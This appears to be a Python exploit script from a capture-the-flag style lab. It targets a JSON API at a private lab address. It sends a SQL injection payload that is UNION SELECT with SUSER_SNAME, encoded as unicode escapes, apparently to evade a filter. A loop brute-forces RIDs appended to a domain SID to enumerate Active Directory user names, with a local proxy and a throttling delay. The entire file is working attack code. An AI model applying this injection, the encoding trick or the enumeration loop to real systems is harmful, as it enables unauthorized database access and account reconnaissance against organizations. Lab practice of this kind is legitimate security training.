#!/usr/bin/python
from struct import *
from construct import Int32sl
import requests
import sys
import time
import json

url = "http://10.10.10.179/api/getColleagues"

headerValues = {'User-Agent' : 'Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0', 
		'Accept' :'application/json, text/plain, */*',
		'Accept-Language': 'en-US,en;q=0.5',
		'Accept-Encoding': 'gzip, deflate',
		'Content-Type': 'application/json;charset=utf-8',
		'Connection': 'close'}
proxyValues = {'http': 'http://127.0.0.1:8080'}

#\u0061\u0027\u0020\u0075\u006E\u0069\u006F\u006E\u0020\u0073\u0065\u006C\u0065\u0063\u0074\u0020\u0031\u002C\u0032\u002C\u0053\u0055\u0053\u0045\u0052\u005F\u0053\u004E\u0041\u004D\u0045\u00280x0105000000000005150000001C00D1BCD181F1492BDFC236F5010000\u0029\u002C\u0034\u002C\u0035\u0020\u002D\u002D

#Example request
#a' union select 1,2,SUSER_SNAME(0x0105000000000005150000001C00D1BCD181F1492BDFC236F5010000),4,5 --
sid = "0x0105000000000005150000001C00D1BCD181F1492BDFC236"
prefix_payload = r"\u0061\u0027\u0020\u0075\u006E\u0069\u006F\u006E\u0020\u0073\u0065\u006C\u0065\u0063\u0074\u0020\u0031\u002C\u0032\u002C\u0053\u0055\u0053\u0045\u0052\u005F\u0053\u004E\u0041\u004D\u0045\u0028"
postfix_payload = r"\u0029\u002C\u0034\u002C\u0035\u0020\u002D\u002D"

#jsondata = {"name": + prefix_payload+sid+ 'f4010000' + postfix_payload }
#data = '{"name": "'+ prefix_payload + sid + "f4010000" + postfix_payload + '"}'
#print (data)

listOfDomainUsers =[]

for i in range (500,3000):
	print ("Trying %d" % i)
	value= Int32sl.build(i).hex()
	data = '{"name": "'+ prefix_payload + sid + value + postfix_payload + '"}'
	r = requests.post(url, headers=headerValues, proxies=proxyValues,data=data)
	#print (prefix_payload+sid+value+postfix_payload)
	if r.status_code == 200:
		jsonResponse = json.loads(r.text)
		if len (jsonResponse[0]["position"]) > 3:
			print ("Found user!: " + jsonResponse[0]["position"])
			listOfDomainUsers.append(jsonResponse[0]["position"])
		
	time.sleep(1.3)

print ("Dun dun dun final list!")
for i in listOfDomainUsers:
	print (i)
